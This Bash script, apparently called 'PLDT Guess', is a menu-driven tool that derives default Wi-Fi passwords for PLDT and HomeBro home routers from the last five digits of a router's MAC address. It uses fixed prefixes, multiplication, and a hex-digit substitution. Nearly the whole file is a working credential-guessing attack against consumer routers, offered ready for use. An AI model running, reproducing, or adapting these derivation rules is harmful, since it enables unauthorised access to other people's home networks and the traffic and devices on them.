#!/bin/bash

# Show banner here
banner() {
clear
echo ""

echo "       :::::::::  :::        ::::::::: :::::::::::     "
echo "      :+:    :+: :+:        :+:    :+:    :+:          "
echo "     +:+    +:+ +:+        +:+    +:+    +:+           "
echo "    +#++:++#+  +#+        +#+    +:+    +#+            "
echo "   +#+        +#+        +#+    +#+    +#+             "
echo "  #+#        #+#        #+#    #+#    #+#  CODED BY:   "
echo " ###        ########## #########     ###  JAYSON C. SAN BUENAVENTURA    "
echo "                    ::::::::  :::    ::: :::::::::: ::::::::   :::::::: "
echo "                  :+:    :+: :+:    :+: :+:       :+:    :+: :+:    :+: "
echo "                 +:+        +:+    +:+ +:+       +:+        +:+         "
echo "                :#:        +#+    +:+ +#++:++#  +#++:++#++ +#++:++#++   "
echo "               +#+   +#+# +#+    +#+ +#+              +#+        +#+    "
echo "              #+#    #+# #+#    #+# #+#       #+#    #+# #+#    #+#     "
echo "             ########   ########  ########## ########   ########        "
echo ""
}                                                    

# Main menu of this tool
main_menu() {
    banner
    echo " [01] PLDTHOMEDSL, PLDTmyDSLPAL, PLDmyDSLBiz (mac address)"
    echo " [02] PLDTHOMEDSL (last 5 digit number)"
    echo " [03] PLDTHOMEFIBR_xxxxx (w/ underscore)"
    echo " [04] PLDTHOMEFIBRxxxx (w/o underscore)" 
    echo " [05] HomeBro_Ultera"
    echo " [00] Exit" 
    echo ""
    echo " ┌─[pldt@guess]─[~]"
    read -p " └──╼ $ " choose
    if [[ $choose == "01" || $choose == "1" ]]; then
    pldthomedsl_pldymydslpal_pldtmydslbiz
    elif [[ $choose == "02" || $choose == "2" ]]; then
    pldt_home_dsl_num
    elif [[ $choose == "03" || $choose == "3" ]]; then
    pldt_home_fibr_xxxxxx
    elif [[ $choose == "04" || $choose == "4" ]]; then
    pldt_home_fibrxxxxxx
    elif [[ $choose == "05" || $choose == "5" ]]; then
    home_bro_ultera
    elif [[ $choose == "00" || $choose == "0" ]]; then
    clear
    exit
    fi
}

# Function to guess PLDTHOMEDSL, PLDTmyDSLPAL, PLDTmyDSLBiz default password using mac address
pldthomedsl_pldymydslpal_pldtmydslbiz() {
    banner
    read -p " Enter the last 5 digit of mac address: " mac
    echo ""
    echo " The defalt pass is: PLDTWIFI$mac"
    echo ""
    read -p " Do you want to continue (Y/n)?: " con
    if [[ $con == "Y" || $con == "y" ]]; then
    main_menu
    else
    clear
    exit
    fi
}

# Function to guess PLDTHOMEDSL default password isng last 5 digit number
pldt_home_dsl_num() {
    banner
    read -p " Enter the last 5 digit of mac address: " mac
    m=$mac
    let a="m*3+0"
    echo ""
    echo " The defalt pass is: PLDTWIFI$a"
    echo ""
    read -p " Do you want to continue (Y/n)?: " con
    if [[ $con == "Y" || $con == "y" ]]; then
    main_menu
    else
    clear
    exit
    fi
}

# Function to guess PLDTHOMEFIBR_xxxxx default password
pldt_home_fibr_xxxxxx() {
    banner
    read -p " Enter the last 5 digit of mac address: " mac
    pass=$(echo "$mac" | tr 0123456789abcdef fedcba9876543210)
    echo " The defalt pass is: wlan$pass"
    echo ""
    read -p " Do you want to continue (Y/n)?: " con
    if [[ $con == "Y" || $con == "y" ]]; then
    main_menu
    else
    clear
    exit
    fi
}

# Function to guess PLDTHOMEFIBRxxxxx default password
pldt_home_fibrxxxxxx() {
    banner
    read -p " Enter the last 5 digit of mac address: " mac
    pass=$(echo "$mac" | tr 0123456789abcdef fedcba9876543210)
    echo " The defalt pass is: PLDTWIFI$pass"
    echo ""
    read -p " Do you want to continue (Y/n)?: " con
    if [[ $con == "Y" || $con == "y" ]]; then
    main_menu
    else
    clear
    exit
    fi
}

# Function to guess PLDTmyDSLPAL default password
home_bro_ultera() {
    banner
    read -p " Enter the last 5 digit of mac address: " mac
    echo ""
    echo " The defalt pass is: HomeBro_$mac"
    echo ""
    read -p " Do you want to continue (Y/n)?: " con
    if [[ $con == "Y" || $con == "y" ]]; then
    main_menu
    else
    clear
    exit
    fi
}

# Main Argument
main_menu